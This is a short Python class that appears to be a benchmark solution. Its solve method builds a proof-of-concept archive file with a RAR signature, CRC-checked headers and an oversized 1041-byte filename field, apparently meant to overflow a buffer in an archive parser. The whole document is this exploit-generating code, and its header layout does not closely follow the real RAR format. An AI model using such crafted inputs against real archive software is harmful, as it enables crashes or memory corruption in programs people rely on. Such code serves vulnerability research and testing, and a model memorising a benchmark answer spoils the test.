class Solution:
    def _rar_crc16_update(self, crc: int, b: int) -> int:
        crc ^= b << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) & 0xFFFF) ^ 0x1021
            else:
                crc = (crc << 1) & 0xFFFF
        return crc

    def _build_block(self, typ: int, flags: int, data: bytes) -> bytes:
        block_size = 8 + len(data)
        size_bytes = block_size.to_bytes(4, 'little')
        fixed_part = (
            typ.to_bytes(1, 'little') +
            flags.to_bytes(1, 'little') +
            size_bytes +
            data
        )
        crc = 0
        for byte_val in fixed_part:
            crc = self._rar_crc16_update(crc, byte_val)
        crc_bytes = crc.to_bytes(2, 'little')
        return crc_bytes + fixed_part

    def solve(self, src_path: str) -> bytes:
        signature = b'Rar!\x05\x00'
        main_block = self._build_block(0x00, 0x41, b'')
        host_os = 0x00
        file_flags = 0x00
        file_attr = 0x20
        unp_size = 0
        mtime = 0
        file_crc = 0
        name_size = 1041
        name = b'a' * name_size
        data_file = (
            host_os.to_bytes(1, 'little') +
            file_flags.to_bytes(1, 'little') +
            file_attr.to_bytes(4, 'little') +
            unp_size.to_bytes(8, 'little') +
            mtime.to_bytes(4, 'little') +
            file_crc.to_bytes(4, 'little') +
            name_size.to_bytes(4, 'little') +
            name
        )
        file_block = self._build_block(0x01, 0x72, data_file)
        poc = signature + main_block + file_block
        return poc
